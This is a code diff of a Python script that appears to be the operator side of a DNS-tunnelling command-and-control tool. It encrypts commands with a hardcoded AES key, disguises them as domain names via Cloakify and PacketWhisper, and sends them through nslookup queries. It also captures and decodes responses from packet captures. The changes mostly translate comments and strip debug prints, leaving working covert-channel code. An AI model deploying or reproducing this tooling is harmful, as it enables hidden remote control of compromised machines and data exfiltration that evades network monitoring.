@@ -6,42 +6,34 @@ from aes_encrypt import decrypt_message, encrypt_message
 from cloakify import Cloakify
 from packetWhisper import ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries, TransferCloakedFile
 
-# Chiave AES (16, 24 o 32 byte)
+# AES Key
 key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
 cipher = "ciphers\\common_fqdn\\topWebsites"
 command = None
 
 def send_command(command, dns='localhost'):
-    # Criptare il comando
-    encrypted_command = encrypt_message(command, key) #debug
-    #print("Encrypted command: "+encrypted_command)
-    # Genera e cloackifica il comando in `cloaked_command.txt`
+    encrypted_command = encrypt_message(command, key) 
     cloaked_command = "cloaked_command.txt"
     
-    #print("Cloaking command...")
     Cloakify(encrypted_command, cipher, cloaked_command)
 
-    #print("Initializing command transfer")
     TransferCloakedFile("cloaked_command.txt", 0.0, dns)
-    # Verifica che il file `cloaked_command.txt` sia stato creato correttamente
     if not os.path.exists(cloaked_command):
-        print("Errore: il file `cloaked_command.txt` non è stato creato.")
+        print("Error: file `cloaked_command.txt` not created. (Please check permissions)")
         return
 
-    # Invia il comando tramite pacchetti DNS
+    # Send command using dns requests
     with open(cloaked_command, 'r') as file:
         for fqdn in file:
             fqdn_str = fqdn.strip()
             subprocess.call(['nslookup', fqdn_str, dns], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    # Rimuove il file dopo l'invio per evitare invii ripetuti
+    # Remove command file
     os.remove(cloaked_command)
 
 
 def receive_response(dns='localhost'):
-    #print("Capturing pcap...")
     subprocess.call(['python', 'pcapCapture.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
-    #print("pcap collected...")
     dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_response.pcap", osStr="Windows")
     cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
 
@@ -54,17 +46,15 @@ def receive_response(dns='localhost'):
             print("No response received.")
             return
         
-    # Decloakificare il comando
-    #print("Decloakifying...")
+    # Decloakify the command
     if Decloakify(cloaked_response, cipher, decloaked_response) == -1:
         print("Requesting re-trasmission")
         send_command('rt', dns)
         receive_response()
 
-    # Decrypt command
+    # Decrypt the command
     with open(decloaked_response, 'r') as file:
         encrypted_response = file.read().strip()
-    #print("encrypted_response: ", encrypted_response)
     response = decrypt_message(encrypted_response, key)
     print(f'\n {response}')
     if response=='rt':
@@ -72,7 +62,7 @@ def receive_response(dns='localhost'):
     
         
 
-    # Rimuove il file di comando dopo l'elaborazione
+    # Remove useless file after execution
     os.remove(cloaked_response)
     os.remove(decloaked_response)
 
